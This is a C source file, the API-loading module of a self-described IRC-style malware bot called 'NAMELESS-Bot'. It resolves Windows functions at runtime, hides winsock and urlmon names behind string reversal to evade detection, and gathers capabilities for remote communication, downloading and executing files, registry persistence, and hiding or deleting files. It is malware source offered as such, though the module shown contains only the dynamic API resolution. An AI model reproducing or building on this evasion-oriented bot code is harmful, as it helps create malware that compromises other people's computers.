/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

FARPROC my_WSACleanup, my_WSAStartup, my_closesocket, my_connect, my_gethostbyname, my_htons, my_recv, my_send, my_socket, my_inet_addr, my_select;
FARPROC my_DownloadFile;
FARPROC my_ShellExecute;
FARPROC my_RegCreateKeyEx, my_RegSetValueEx, my_RegCloseKey; /*, my_RegOpenKeyEx, my_RegQueryValueEx;*/
FARPROC my_WaitForSingleObject, my_CreateMutex, my_ExitThread, my_CreateThread, my_GetLocaleInfo, my_GetModuleFileName,
        my_GetModuleHandle, my_GetDriveType, my_SetFileAttributes, my_DeleteFile, my_CopyFile, my_GetVersionEx,
        my_GetLongPathName, my_CreateFile, my_WriteFile, my_CreateProcess, my_CloseHandle, my_CreateDirectory;
FARPROC my_URLDownloadToFile;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

HMODULE advapi32;
HMODULE shell32;
HMODULE WS2_32;
HMODULE urlmon;
HMODULE kernel32;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void load_apis(void)
{
    advapi32              = LoadLibrary(advapi32_);
    shell32               = LoadLibrary(shell32_);
    WS2_32                = LoadLibrary(Reverse_Str(WS2_32_));
    urlmon                = LoadLibrary(Reverse_Str(urlmon_));

    /* Shell32.dll */
    my_ShellExecute       = GetProcAddress(shell32, ShellExecute_);

    /* Advapi32.dll */
    my_RegCreateKeyEx     = GetProcAddress(advapi32, RegCreateKeyEx_);
    my_RegSetValueEx      = GetProcAddress(advapi32, RegSetValueEx_);
    my_RegCloseKey        = GetProcAddress(advapi32, RegCloseKey_);
    /*my_RegOpenKeyEx       = GetProcAddress(advapi32, RegOpenKeyEx_);
    my_RegQueryValueEx    = GetProcAddress(advapi32, RegQueryValueEx_);*/

    /* WS2_32.dll */
    my_WSACleanup         = GetProcAddress(WS2_32, Reverse_Str(WSACleanup_));
    my_WSAStartup         = GetProcAddress(WS2_32, Reverse_Str(WSAStartup_));
    my_closesocket        = GetProcAddress(WS2_32, Reverse_Str(closesocket_));
    my_connect            = GetProcAddress(WS2_32, Reverse_Str(connect_));
    my_gethostbyname      = GetProcAddress(WS2_32, Reverse_Str(gethostbyname_));
    my_htons              = GetProcAddress(WS2_32, Reverse_Str(htons_));
    my_recv               = GetProcAddress(WS2_32, Reverse_Str(recv_));
    my_send               = GetProcAddress(WS2_32, Reverse_Str(send_));
    my_socket             = GetProcAddress(WS2_32, Reverse_Str(socket_));
    my_inet_addr          = GetProcAddress(WS2_32, Reverse_Str(inet_addr_));
    my_select             = GetProcAddress(WS2_32, Reverse_Str(select_));

    /* Urlmon.dll */
    my_URLDownloadToFile  = GetProcAddress(urlmon, URLDownloadToFile_);
}
